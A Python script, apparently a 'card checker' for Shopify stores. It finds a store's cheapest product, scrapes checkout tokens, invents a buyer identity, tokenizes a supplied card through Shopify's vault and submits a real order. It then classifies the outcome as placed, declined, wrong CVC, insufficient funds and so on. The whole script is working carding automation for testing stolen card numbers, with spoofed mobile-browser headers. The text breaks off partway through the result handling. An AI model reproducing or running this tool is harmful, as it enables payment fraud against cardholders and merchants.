"""
Shopify Terminal - GraphQL Checkout Card Checker
Based on api.py style with full GraphQL checkout flow
"""

import asyncio
import httpx
import json
import time
import random
import string
import re
from urllib.parse import urlparse


# Currency to Country mapping
C2C = {
    "USD": "US",
    "CAD": "CA",
    "INR": "IN",
    "AED": "AE",
    "HKD": "HK",
    "GBP": "GB",
    "CHF": "CH",
    "EUR": "DE",
    "AUD": "AU",
}

# Address book for different countries
ADDRESS_BOOK = {
    "US": {"address1": "123 Main St", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
    "CA": {"address1": "88 Queen St", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
    "IN": {"address1": "221B MG Road", "city": "Mumbai", "postalCode": "400001", "zoneCode": "MH", "countryCode": "IN", "phone": "9876543210"},
    "AE": {"address1": "Burj Tower", "city": "Dubai", "postalCode": "", "zoneCode": "DU", "countryCode": "AE", "phone": "501234567"},
    "HK": {"address1": "Nathan 88", "city": "Kowloon", "postalCode": "", "zoneCode": "KL", "countryCode": "HK", "phone": "55555555"},
    "CN": {"address1": "8 Zhongguancun Street", "city": "Beijing", "postalCode": "100080", "zoneCode": "BJ", "countryCode": "CN", "phone": "1062512345"},
    "CH": {"address1": "Gotthardstrasse 17", "city": "Schweiz", "postalCode": "6430", "zoneCode": "SZ", "countryCode": "CH", "phone": "445512345"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DE": {"address1": "Friedrichstrasse 123", "city": "Berlin", "postalCode": "10117", "zoneCode": "BE", "countryCode": "DE", "phone": "301234567"},
    "DEFAULT": {"address1": "123 Main St", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
}

# Random name generators
FIRST_NAMES = ['John', 'James', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Joseph', 'Thomas', 'Charles']
LAST_NAMES = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez']


def capture(data, first, last):
    """Extract text between two strings"""
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None


def pick_addr(url, cc=None, rc=None):
    """Pick appropriate address based on currency and country"""
    cc = (cc or "").upper()
    rc = (rc or "").upper()
    dom = urlparse(url).netloc
    tcn = dom.split('.')[-1].upper()

    if tcn in ADDRESS_BOOK:
        return ADDRESS_BOOK[tcn]

    ccn = C2C.get(cc)

    if rc in ADDRESS_BOOK and ccn == rc:
        return ADDRESS_BOOK[rc]
    elif rc in ADDRESS_BOOK:
        return ADDRESS_BOOK[rc]
    return ADDRESS_BOOK["DEFAULT"]


def generate_random_name():
    """Generate random first and last name"""
    return random.choice(FIRST_NAMES), random.choice(LAST_NAMES)


def generate_email(first_name, last_name):
    """Generate random email address"""
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
    random_num = ''.join(random.choices(string.digits, k=3))
    return f"{first_name.lower()}.{last_name.lower()}{random_num}@{random.choice(domains)}"


def get_product_id(response):
    """Get cheapest available product from store"""
    try:
        response_data = response.json()
        products_data = response_data.get("products", [])
        products = {}
        
        for product in products_data:
            variants = product.get("variants", [])
            for variant in variants:
                product_id = variant.get("id")
                available = variant.get("available", False)
                try:
                    price = float(variant.get("price", 0))
                except (ValueError, TypeError):
                    continue
                    
                if price < 0.1:
                    continue
                if available:
                    products[product_id] = price
                    
        if products:
            min_price_product_id = min(products, key=products.get)
            price = products[min_price_product_id]
            return min_price_product_id, price

        return None, None
    except Exception:
        return None, None


async def shopify_checkout(url, card, session):
    """
    Main Shopify GraphQL checkout function
    Returns dict with Response, Status, Gateway, Price, cc
    """
    output = {
        "Response": "UNKNOWN ERROR",
        "Status": False,
    }
    start_time = time.time()
    
    try:
        # Parse card details
        cc, mes, ano, cvv = map(str.strip, card.split("|"))
        
        # Ensure year is 2-digit
        if len(ano) == 4:
            ano = ano[2:]
        
        # Clean URL
        url = url.rstrip('/')
        if not url.startswith('http'):
            url = f"https://{url}"
        domain = urlparse(url).netloc
        
        # Generate random buyer info
        first_name, last_name = generate_random_name()
        email = generate_email(first_name, last_name)
        
        print(f"[*] Fetching products from {domain}...")
        
        # Step 1: Get products
        try:
            request = await session.get(f"{url}/products.json", timeout=15.0)
            product_id, price = get_product_id(request)
        except Exception as e:
            output.update({
                "Response": f"PRODUCTS ERROR: {str(e)}",
                "Status": False,
            })
            return output
            
        if not product_id:
            output.update({
                "Response": "NO AVAILABLE PRODUCTS",
                "Status": False,
            })
            return output
            
        print(f"[+] Found product: ${price:.2f} (ID: {product_id})")
        
        # Step 2: Get storefront access token
        try:
            request = await session.get(url, timeout=15.0)
            site_key = capture(request.text, '"accessToken":"', '"')
        except Exception as e:
            output.update({
                "Response": f"SITE ERROR: {str(e)}",
                "Status": False,
            })
            return output
            
        if not site_key:
            output.update({
                "Response": "NO STOREFRONT ACCESS TOKEN",
                "Status": False,
            })
            return output
            
        print(f"[+] Got storefront access token")
        
        # Step 3: Create cart using GraphQL
        print(f"[*] Creating cart...")
        
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': url,
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-sdk-variant': 'portable-wallets',
            'x-shopify-storefront-access-token': site_key,
            'x-start-wallet-checkout': 'true',
            'x-wallet-name': 'MoreOptions'
        }
        
        cart_query = 'mutation cartCreate($input:CartInput!$country:CountryCode$language:LanguageCode$withCarrierRates:Boolean=false)@inContext(country:$country language:$language){result:cartCreate(input:$input){...@defer(if:$withCarrierRates){cart{...CartParts}errors:userErrors{...on CartUserError{message field code}}warnings:warnings{...on CartWarning{code}}}}}fragment CartParts on Cart{id checkoutUrl deliveryGroups(first:10 withCarrierRates:$withCarrierRates){edges{node{id groupType selectedDeliveryOption{code title handle deliveryPromise deliveryMethodType estimatedCost{amount currencyCode}}deliveryOptions{code title handle deliveryPromise deliveryMethodType estimatedCost{amount currencyCode}}}}}cost{subtotalAmount{amount currencyCode}totalAmount{amount currencyCode}totalTaxAmount{amount currencyCode}totalDutyAmount{amount currencyCode}}discountAllocations{discountedAmount{amount currencyCode}...on CartCodeDiscountAllocation{code}...on CartAutomaticDiscountAllocation{title}...on CartCustomDiscountAllocation{title}}discountCodes{code applicable}lines(first:10){edges{node{quantity cost{subtotalAmount{amount currencyCode}totalAmount{amount currencyCode}}discountAllocations{discountedAmount{amount currencyCode}...on CartCodeDiscountAllocation{code}...on CartAutomaticDiscountAllocation{title}...on CartCustomDiscountAllocation{title}}merchandise{...on ProductVariant{requiresShipping}}sellingPlanAllocation{priceAdjustments{price{amount currencyCode}}sellingPlan{billingPolicy{...on SellingPlanRecurringBillingPolicy{interval intervalCount}}priceAdjustments{orderCount}recurringDeliveries}}}}}}'
        
        cart_data = {
            'query': cart_query,
            'variables': {
                'input': {
                    'lines': [
                        {
                            'merchandiseId': f'gid://shopify/ProductVariant/{product_id}',
                            'quantity': 1,
                            'attributes': [],
                        },
                    ],
                    'discountCodes': [],
                },
                'country': 'US',
                'language': 'EN',
            },
        }
        
        request = await session.post(
            f'{url}/api/unstable/graphql.json',
            params={'operation_name': 'cartCreate'},
            headers=headers,
            json=cart_data,
            timeout=20.0
        )
        
        try:
            data = request.json()
            checkout_url = data["data"]["result"]["cart"]["checkoutUrl"]
        except Exception as e:
            output.update({
                "Response": f"CART CREATE FAILED: {str(e)}",
                "Status": False,
            })
            return output
            
        print(f"[+] Cart created, checkout URL obtained")
        
        # Step 4: Access checkout page and extract tokens
        print(f"[*] Accessing checkout page...")
        
        checkout_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
        }
        
        request = await session.get(
            checkout_url,
            headers=checkout_headers,
            params={'skip_shop_pay': 'true'},
            follow_redirects=True,
            timeout=20.0
        )
        
        # Extract required tokens from checkout page
        html = request.text
        
        payment_method_id = capture(html, "paymentMethodIdentifier&quot;:&quot;", "&quot")
        stable_id = capture(html, "stableId&quot;:&quot;", "&quot")
        queue_token = capture(html, "queueToken&quot;:&quot;", "&quot")
        currency_code = capture(html, "currencyCode&quot;:&quot;", "&quot") or "USD"
        country_code = capture(html, "countryCode&quot;:&quot;", "&quot") or "US"
        session_token = capture(html, 'serialized-session-token" content="&quot;', '&quot')
        source_token = capture(html, 'serialized-source-token" content="&quot;', '&quot')
        web_build = capture(html, 'serialized-client-bundle-info" content="{&quot;browsers&quot;:&quot;latest&quot;,&quot;format&quot;:&quot;es&quot;,&quot;locale&quot;:&quot;en&quot;,&quot;sha&quot;:&quot;', '&quot')
        tax = capture(html, "totalTaxAndDutyAmount&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;", "&quot") or "0"
        delivery_method_type = capture(html, 'deliveryMethodTypes&quot;:[&quot;', '&quot;],&quot;') or "SHIPPING"
        
        # Get gateway info
        gateway = capture(html, 'extensibilityDisplayName&quot;:&quot;', '&quot')
        if gateway == "Shopify Payments":
            gateway = "Normal"
        elif not gateway:
            gateway = "Unknown"
            
        if not session_token:
            output.update({
                "Response": "NO SESSION TOKEN",
                "Status": False,
            })
            return output
            
        print(f"[+] Tokens extracted - Gateway: {gateway}")
        
        # Get appropriate address
        addr = pick_addr(url, cc=currency_code, rc=country_code)
        
        try:
            ttax = float(tax) if tax else 0
        except (ValueError, TypeError):
            ttax = 0
            
        # Step 5: Tokenize card via Shopify Vault
        print(f"[*] Tokenizing card...")
        
        vault_headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://checkout.shopify.com',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
        }
        
        vault_data = {
            "credit_card": {
                "number": cc,
                "name": f"{first_name} {last_name}",
                "month": int(mes),
                "year": int(f"20{ano}") if len(ano) == 2 else int(ano),
                "verification_value": cvv
            },
            "payment_session_scope": domain
        }
        
        vault_request = await session.post(
            "https://vault.shopify.com/sessions",
            headers=vault_headers,
            json=vault_data,
            timeout=15.0
        )
        
        try:
            vault_response = vault_request.json()
            session_id = vault_response.get("id")
        except Exception:
            session_id = None
            
        if not session_id:
            output.update({
                "Response": "CARD TOKENIZATION FAILED",
                "Status": False,
                "Gateway": gateway,
            })
            return output
            
        print(f"[+] Card tokenized successfully")
        
        # Step 6: Submit Proposal (shipping info)
        print(f"[*] Submitting shipping proposal...")
        
        graphql_headers = {
            'authority': domain,
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/json',
            'origin': url,
            'referer': url,
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-checkout-one-session-token': session_token,
            'x-checkout-web-build-id': web_build or '',
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-server-handling': 'fast',
            'x-checkout-web-server-rendering': 'yes',
            'x-checkout-web-source-id': source_token or ''
        }
        
        proposal_query = 'query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput,$memberships:MembershipsInput,$cartMetafields:[MetafieldInput!]){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions,memberships:$memberships,cartMetafields:$cartMetafields},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{queueToken sellerProposal{delivery{...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{handle deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode}}}}}}}}}}}}}}'
        
        proposal_data = {
            'query': proposal_query,
            'variables': {
                'sessionInput': {
                    'sessionToken': session_token,
                },
                'queueToken': queue_token,
                'discounts': {
                    'lines': [],
                    'acceptUnexpectedDiscounts': True,
                },
                'delivery': {
                    'deliveryLines': [
                        {
                            'destination': {
                                'partialStreetAddress': {
                                    'address1': addr["address1"],
                                    'city': addr["city"],
                                    'countryCode': addr["countryCode"],
                                    'postalCode': addr["postalCode"],
                                    'firstName': first_name,
                                    'lastName': last_name,
                                    'zoneCode': addr["zoneCode"],
                                    'phone': addr["phone"],
                                    'oneTimeUse': False,
                                },
                            },
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyMatchingConditions': {
                                    'estimatedTimeInTransit': {
                                        'any': True,
                                    },
                                    'shipments': {
                                        'any': True,
                                    },
                                },
                                'options': {},
                            },
                            'targetMerchandiseLines': {
                                'any': True,
                            },
                            'deliveryMethodTypes': [
                                'SHIPPING',
                                'LOCAL',
                            ],
                            'expectedTotalPrice': {
                                'any': True,
                            },
                            'destinationChanged': False,
                        },
                    ],
                    'noDeliveryRequired': [],
                    'useProgressiveRates': False,
                    'prefetchShippingRatesStrategy': None,
                    'supportsSplitShipping': True,
                },
                'deliveryExpectations': {
                    'deliveryExpectationLines': [],
                },
                'merchandise': {
                    'merchandiseLines': [
                        {
                            'stableId': stable_id,
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{product_id}',
                                    'variantId': f'gid://shopify/ProductVariant/{product_id}',
                                    'properties': [],
                                    'sellingPlanId': None,
                                    'sellingPlanDigest': None,
                                },
                            },
                            'quantity': {
                                'items': {
                                    'value': 1,
                                },
                            },
                            'expectedTotalPrice': {
                                'value': {
                                    'amount': f"{price}",
                                    'currencyCode': f'{currency_code}',
                                },
                            },
                            'lineComponentsSource': None,
                            'lineComponents': [],
                        },
                    ],
                },
                'memberships': {
                    'memberships': [],
                },
                'payment': {
                    'totalAmount': {
                        'any': True,
                    },
                    'paymentLines': [],
                    'billingAddress': {
                        'streetAddress': {
                            'address1': addr["address1"],
                            'city': addr["city"],
                            'countryCode': addr["countryCode"],
                            'postalCode': addr["postalCode"],
                            'firstName': first_name,
                            'lastName': last_name,
                            'zoneCode': addr["zoneCode"],
                            'phone': addr["phone"],
                        },
                    },
                },
                'buyerIdentity': {
                    'customer': {
                        'presentmentCurrency': f'{currency_code}',
                        'countryCode': f'{country_code}',
                    },
                    'email': email,
                    'emailChanged': False,
                    'phoneCountryCode': f'{country_code}',
                    'marketingConsent': [],
                    'shopPayOptInPhone': {
                        'countryCode': f'{country_code}',
                    },
                    'rememberMe': False,
                },
                'tip': {
                    'tipLines': [],
                },
                'taxes': {
                    'proposedAllocations': None,
                    'proposedTotalAmount': {
                        'value': {
                            'amount': f"{ttax}",
                            'currencyCode': f'{currency_code}',
                        },
                    },
                    'proposedTotalIncludedAmount': None,
                    'proposedMixedStateTotalAmount': None,
                    'proposedExemptions': [],
                },
                'note': {
                    'message': None,
                    'customAttributes': [],
                },
                'localizationExtension': {
                    'fields': [],
                },
                'nonNegotiableTerms': None,
                'scriptFingerprint': {
                    'signature': None,
                    'signatureUuid': None,
                    'lineItemScriptChanges': [],
                    'paymentScriptChanges': [],
                    'shippingScriptChanges': [],
                },
                'optionalDuties': {
                    'buyerRefusesDuties': False,
                },
                'cartMetafields': [],
            },
            'operationName': 'Proposal',
        }
        
        # Retry proposal up to 3 times
        shipping_handle = None
        shipping_amount = "0"
        
        for _ in range(3):
            request = await session.post(
                f'{url}/checkouts/unstable/graphql',
                params={'operationName': 'Proposal'},
                headers=graphql_headers,
                json=proposal_data,
                timeout=20.0
            )
            
            if "signedHandle" in request.text or "handle" in request.text:
                try:
                    resp_json = request.json()
                    delivery_lines = resp_json.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {}).get("sellerProposal", {}).get("delivery", {}).get("deliveryLines", [])
                    if delivery_lines:
                        strategies = delivery_lines[0].get("availableDeliveryStrategies", [])
                        if strategies:
                            shipping_handle = strategies[0].get("handle")
                            breakdown = strategies[0].get("deliveryStrategyBreakdown", [])
                            if breakdown:
                                shipping_amount = breakdown[0].get("amount", {}).get("value", {}).get("amount", "0")
                except Exception:
                    pass
                break
            await asyncio.sleep(0.5)
            
        if not shipping_handle:
            output.update({
                "Response": "NO SHIPPING OPTIONS",
                "Status": False,
                "Gateway": gateway,
                "Price": price,
            })
            return output
            
        print(f"[+] Shipping proposal submitted - Amount: ${shipping_amount}")
        
        # Calculate total
        try:
            total = price + float(shipping_amount) + ttax
        except (ValueError, TypeError):
            total = price
            
        # Step 7: Submit for completion
        print(f"[*] Submitting order (Total: ${total:.2f})...")
        
        submit_query = 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage nonLocalizedMessage}}}...on Throttled{pollAfter pollUrl queueToken}...on CheckpointDenied{redirectUrl}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderStatusPageUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}'
        
        submit_data = {
            'query': submit_query,
            'variables': {
                'input': {
                    'sessionInput': {
                        'sessionToken': session_token,
                    },
                    'queueToken': queue_token,
                    'discounts': {
                        'lines': [],
                        'acceptUnexpectedDiscounts': True,
                    },
                    'delivery': {
                        'deliveryLines': [
                            {
                                'selectedDeliveryStrategy': {
                                    'deliveryStrategyMatchingConditions': {
                                        'estimatedTimeInTransit': {
                                            'any': True,
                                        },
                                        'shipments': {
                                            'any': True,
                                        },
                                    },
                                    'options': {
                                        'phone': addr["phone"],
                                    },
                                },
                                'targetMerchandiseLines': {
                                    'lines': [
                                        {
                                            'stableId': stable_id,
                                        },
                                    ],
                                },
                                'deliveryMethodTypes': [
                                    delivery_method_type,
                                ],
                                'expectedTotalPrice': {
                                    'value': {
                                        'amount': f'{shipping_amount}',
                                        'currencyCode': f'{currency_code}',
                                    },
                                },
                                'destinationChanged': False,
                            },
                        ],
                        'noDeliveryRequired': [],
                        'useProgressiveRates': False,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True,
                    },
                    'deliveryExpectations': {
                        'deliveryExpectationLines': [],
                    },
                    'merchandise': {
                        'merchandiseLines': [
                            {
                                'stableId': stable_id,
                                'merchandise': {
                                    'productVariantReference': {
                                        'id': f'gid://shopify/ProductVariantMerchandise/{product_id}',
                                        'variantId': f'gid://shopify/ProductVariant/{product_id}',
                                        'properties': [],
                                        'sellingPlanId': None,
                                        'sellingPlanDigest': None,
                                    },
                                },
                                'quantity': {
                                    'items': {
                                        'value': 1,
                                    },
                                },
                                'expectedTotalPrice': {
                                    'value': {
                                        'amount': f'{price}',
                                        'currencyCode': f'{currency_code}',
                                    },
                                },
                                'lineComponentsSource': None,
                                'lineComponents': [],
                            },
                        ],
                    },
                    'memberships': {
                        'memberships': [],
                    },
                    'payment': {
                        'totalAmount': {
                            'any': True,
                        },
                        'paymentLines': [
                            {
                                'paymentMethod': {
                                    'directPaymentMethod': {
                                        'paymentMethodIdentifier': payment_method_id,
                                        'sessionId': session_id,
                                        'billingAddress': {
                                            'streetAddress': {
                                                'address1': addr["address1"],
                                                'city': addr["city"],
                                                'countryCode': addr["countryCode"],
                                                'postalCode': addr["postalCode"],
                                                'firstName': first_name,
                                                'lastName': last_name,
                                                'zoneCode': addr["zoneCode"],
                                                'phone': addr["phone"],
                                            },
                                        },
                                        'cardSource': None,
                                    },
                                    'giftCardPaymentMethod': None,
                                    'redeemablePaymentMethod': None,
                                    'walletPaymentMethod': None,
                                    'walletsPlatformPaymentMethod': None,
                                    'localPaymentMethod': None,
                                    'paymentOnDeliveryMethod': None,
                                    'paymentOnDeliveryMethod2': None,
                                    'manualPaymentMethod': None,
                                    'customPaymentMethod': None,
                                    'offsitePaymentMethod': None,
                                    'customOnsitePaymentMethod': None,
                                    'deferredPaymentMethod': None,
                                    'customerCreditCardPaymentMethod': None,
                                    'paypalBillingAgreementPaymentMethod': None,
                                },
                                'amount': {
                                    'value': {
                                        'amount': f'{total}',
                                        'currencyCode': f'{currency_code}',
                                    },
                                },
                            },
                        ],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': addr["address1"],
                                'city': addr["city"],
                                'countryCode': addr["countryCode"],
                                'postalCode': addr["postalCode"],
                                'firstName': first_name,
                                'lastName': last_name,
                                'zoneCode': addr["zoneCode"],
                                'phone': addr["phone"],
                            },
                        },
                    },
                    'buyerIdentity': {
                        'customer': {
                            'presentmentCurrency': f'{currency_code}',
                            'countryCode': f'{country_code}',
                        },
                        'email': email,
                        'emailChanged': False,
                        'phoneCountryCode': f'{country_code}',
                        'marketingConsent': [],
                        'shopPayOptInPhone': {
                            'countryCode': f'{country_code}',
                        },
                        'rememberMe': False,
                    },
                    'tip': {
                        'tipLines': [],
                    },
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {
                            'value': {
                                'amount': f'{ttax}',
                                'currencyCode': f'{currency_code}',
                            },
                        },
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': [],
                    },
                    'note': {
                        'message': None,
                        'customAttributes': [],
                    },
                    'localizationExtension': {
                        'fields': [],
                    },
                    'nonNegotiableTerms': None,
                    'scriptFingerprint': {
                        'signature': None,
                        'signatureUuid': None,
                        'lineItemScriptChanges': [],
                        'paymentScriptChanges': [],
                        'shippingScriptChanges': [],
                    },
                    'optionalDuties': {
                        'buyerRefusesDuties': False,
                    },
                    'cartMetafields': [],
                },
                'attemptToken': f'{source_token}-{random.randint(10000, 99999)}',
                'metafields': [],
                'analytics': {
                    'requestUrl': checkout_url,
                    'pageId': f'{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999):012X}',
                },
            },
            'operationName': 'SubmitForCompletion',
        }
        
        request = await session.post(
            f'{url}/checkouts/unstable/graphql',
            params={'operationName': 'SubmitForCompletion'},
            headers=graphql_headers,
            json=submit_data,
            timeout=30.0
        )
        
        # Check for receipt ID and poll
        receipt_id = None
        try:
            resp_json = request.json()
            receipt_data = resp_json.get("data", {}).get("submitForCompletion", {})
            
            # Try to get receipt from different paths
            if "receipt" in receipt_data:
                receipt_id = receipt_data["receipt"].get("id")
            elif receipt_data.get("__typename") == "SubmittedForCompletion":
                receipt_id = receipt_data.get("receipt", {}).get("id")
        except Exception:
            pass
            
        # Step 8: Poll for receipt
        if receipt_id:
            print(f"[*] Polling for result...")
            
            poll_query = 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId sessionToken:$sessionToken){...on ProcessedReceipt{id token orderStatusPageUrl}...on ProcessingReceipt{id pollDelay}...on WaitingReceipt{id pollDelay}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{url}...on CompletePaymentChallengeV2{challengeType challengeData}}}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated}}}}}'
            
            poll_data = {
                'query': poll_query,
                'variables': {
                    'receiptId': receipt_id,
                    'sessionToken': session_token,
                },
                'operationName': 'PollForReceipt',
            }
            
            for i in range(3):
                await asyncio.sleep(3)
                request = await session.post(
                    f'{url}/checkouts/unstable/graphql',
                    params={'operationName': 'PollForReceipt'},
                    headers=graphql_headers,
                    json=poll_data,
                    timeout=20.0
                )
                
                if "WaitingReceipt" not in request.text and "ProcessingReceipt" not in request.text:
                    break
                    
        # Parse final response
        res_text = request.text
        
        try:
            res_json = request.json()
        except Exception:
            res_json = {}
            
        end_time = time.time()
        print(f"[*] Time taken: {end_time - start_time:.2f}s")
        
        # Extract error code
        result = None
        try:
            result = res_json.get('data', {}).get('receipt', {}).get('processingError', {}).get('code')
        except Exception:
            pass
            
        if not result:
            try:
                result = res_json.get('data', {}).get('submitForCompletion', {}).get('receipt', {}).get('processingError', {}).get('code')
            except Exception:
                pass
                
        # Parse response and return appropriate result
        if "shopify_payments" in res_text.lower() or "ProcessedReceipt" in res_text:
            output.update({
                "Response": "ORDER_PLACED",
                "Status": True,
                "Gateway": gateway,
                "Price": total,
                "cc": card
            })
        elif "CompletePaymentChallenge" in res_text or "ActionRequiredReceipt" in res_text:
            output.update({
                "Response": "3DS_REQUIRED",
                "Status": True,
                "Gateway": gateway,
                "Price": total,
                "cc": card
            })
        elif result == 'CARD_DECLINED':
            output.update({
                "Response": "CARD_DECLINED",
                "Status": True,
                "Gateway": gateway,
                "Price": total,
                "cc": card
            })
        elif result == 'INCORRECT_NUMBER':
            output.update({
                "Response": "INCORRECT_NUMBER",
                "Status": True,
                "Gateway": gateway,
                "Price": total,
                "cc": card
            })
        elif result == 'GENERIC_ERROR':
            output.update({
                "Response": "GENERIC_ERROR",
                "Status": True,
                "Gateway": gateway,
                "Price": total,
                "cc": card
            })
        elif result == 'AUTHENTICATION_FAILED':
            output.update({
                "Response": "AUTHENTICATION_FAILED",
                "Status": True,
                "Gateway": gateway,
                "Price": total,
                "cc": card
            })
        elif "FRAUD_SUSPECTED" in res_text:
            output.update({
                "Response": "FRAUD_SUSPECTED",
                "Status": True,
                "Gateway": gateway,
                "Price": total,
                "cc": card
            })
        elif "INCORRECT_ADDRESS" in res_text:
            output.update({
                "Response": "INCORRECT_ADDRESS",
                "Status": True,
                "Gateway": gateway,
                "Price": total,
                "cc": card
            })
        elif "INCORRECT_ZIP" in res_text:
            output.update({
                "Response": "INCORRECT_ZIP",
                "Status": True,
                "Gateway": gateway,
                "Price": total,
                "cc": card
            })
        elif "INCORRECT_PIN" in res_text:
            output.update({
                "Response": "INCORRECT_PIN",
                "Status": True,
                "Gateway": gateway,
                "Price": total,
                "cc": card
            })
        elif "insufficient_funds" in res_text.lower() or "INSUFFICIENT_FUNDS" in res_text:
            output.update({
                "Response": "INSUFFICIENT_FUNDS",
                "Status": True,
                "Gateway": gateway,
                "Price": total,
                "cc": card
            })
        elif "INVALID_CVC" in res_text or "INCORRECT_CVC" in res_text:
            output.update({
                "Response": "INCORRECT_CVC",
                "Status": True,
                "Gateway": gateway,
                "Price": total,
                "cc": card
            })
        elif "EXPIRED_CARD" in res_text:
            output.update({
                "Response": "EXPIRED_CARD",
                "Status": True,
